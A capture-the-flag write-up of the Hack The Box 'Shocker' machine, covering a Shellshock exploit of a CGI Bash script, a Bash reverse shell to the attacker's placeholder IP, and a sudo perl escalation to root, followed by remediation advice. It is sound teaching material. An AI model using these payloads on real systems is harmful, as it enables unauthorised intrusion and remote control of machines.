# Shocker — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Key vulnerability** | Shellshock (CVE-2014-6271) |
| **Techniques** | CGI enumeration · Shellshock RCE · reverse shell · `sudo`/GTFOBins privesc |

---

## Summary

Shocker is a Linux box vulnerable to **Shellshock (CVE-2014-6271)**. A CGI shell script exposed under `/cgi-bin/` is executed by a vulnerable version of Bash, allowing arbitrary command execution through a crafted HTTP header. This yields a foothold as the user `shelly`, who is permitted to run `/usr/bin/perl` as root via `sudo` with no password — abused to spawn a root shell.

**Attack chain:** `nmap` → `gobuster` (find `/cgi-bin/user.sh`) → Shellshock RCE → reverse shell (user) → `sudo perl` (root).

---

## 1. Reconnaissance

Full TCP port scan with service/version detection:

```bash
sudo nmap -p- --min-rate 1000 -sV <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

**Notes**
- SSH is on the non-standard port **2222** — a reminder to always scan all ports (`-p-`) and never assume defaults.
- SSH requires credentials I don't have, so the web server on port 80 is the logical entry point to explore.

---

## 2. Enumeration

The landing page was static with no obvious input, so I brute-forced for hidden content:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

```
/cgi-bin/   (Status: 403)
/index.html (Status: 200)
```

A **403** on `/cgi-bin/` confirms the directory exists but won't list its contents. On Apache, `cgi-bin` holds **executable scripts**, so I enumerated inside it, testing common script extensions:

```bash
gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl
```

```
/user.sh   (Status: 200)
```

Requesting the script returned the **output** of a system command, not its source — confirming server-side execution via CGI:

```bash
curl http://<TARGET_IP>/cgi-bin/user.sh
```

```
Content-Type: text/plain

Just an uptime test script
 03:07:58 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
```

A Bash script executed server-side, on a box named *Shocker* → textbook **Shellshock** candidate.

---

## 3. Exploitation — Shellshock (CVE-2014-6271)

**Root cause.** When Apache runs a CGI script, it passes HTTP headers to the script as **environment variables** (normal behavior). Vulnerable Bash versions, when importing a function definition from an environment variable, keep **executing any commands placed after it**. The attacker controls a header value → controls an environment variable → achieves code execution. The vulnerable component is **Bash**, not the web server.

**Proof of concept.** You cannot tell a CGI script is vulnerable by looking — the output is identical whether Bash is patched or not. Confirm it with a harmless probe (`id`) injected into the `User-Agent` header:

```bash
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://<TARGET_IP>/cgi-bin/user.sh
```

```
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The response returned the output of `id` — a command `user.sh` could never produce on its own — **proving remote code execution** as the user `shelly`.

**Payload breakdown**
- `() { :; };` — empty-function definition that triggers the Bash parser bug.
- `echo; echo;` — emit blank lines so the CGI response is well-formed (avoids a 500 error).
- `/bin/bash -c 'id'` — the command actually executed.

> **Note:** `id` also shows `shelly` in the **lxd** group — an alternative privilege-escalation vector (privileged container mounting the host filesystem). I pursued the cleaner `sudo` path below, but it's worth noting the box offered two routes to root.

---

## 4. Foothold — reverse shell & user flag

One-shot RCE over `curl` is impractical, so I upgraded to an interactive reverse shell.

Listener on the attacking machine:

```bash
nc -lvnp 4444
```

Reverse-shell payload delivered through Shellshock:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<MY_IP>/4444 0>&1'" http://<TARGET_IP>/cgi-bin/user.sh
```

- `/dev/tcp/<MY_IP>/4444` — Bash feature that opens a TCP connection to my listener.
- `>&` and `0>&1` — redirect the shell's output, errors, and input over that connection → a full interactive terminal.

```
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
[REDACTED]
```

---

## 5. Privilege Escalation — sudo + perl

First reflex after obtaining a shell — check sudo permissions:

```bash
sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`shelly` may run **perl as root with no password**. Since Perl is a full programming language, it can spawn a shell — and because it runs as root, the child shell inherits root privileges ([GTFOBins: perl](https://gtfobins.github.io/gtfobins/perl/#sudo)):

```bash
sudo perl -e 'exec "/bin/bash";'
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
[REDACTED]
```

Full compromise achieved — **UID 0**.

---

## 6. Remediation

- **Patch Bash** to a version that fixes CVE-2014-6271 (and the related follow-up CVEs).
- **Remove or disable unused CGI scripts**; restrict `mod_cgi` to only what is required.
- **Never grant `sudo NOPASSWD` on language interpreters** (perl, python, ruby, …) — they are trivially abused into a root shell. Grant least privilege, scoped to specific non-interactive binaries.
- Consider running CGI under a hardened, minimal interpreter and dropping privileges for web-exposed scripts.

---

## Key Takeaways

- A `403` is a positive signal: the resource **exists**, you just can't list it.
- Service *versions* drive exploitation — always run `-sV` and map to CVEs.
- Confirm a vulnerability with a **minimal, harmless PoC** before weaponizing it.
- `sudo -l` is the single highest-value first move in Linux privilege escalation.
- UID 0 — not the name "root" — is what defines full control.

---

*Writeup by Giovanni ([@Gjozizou98](https://github.com/Gjozizou98)) — retired HTB machine, for educational purposes.*
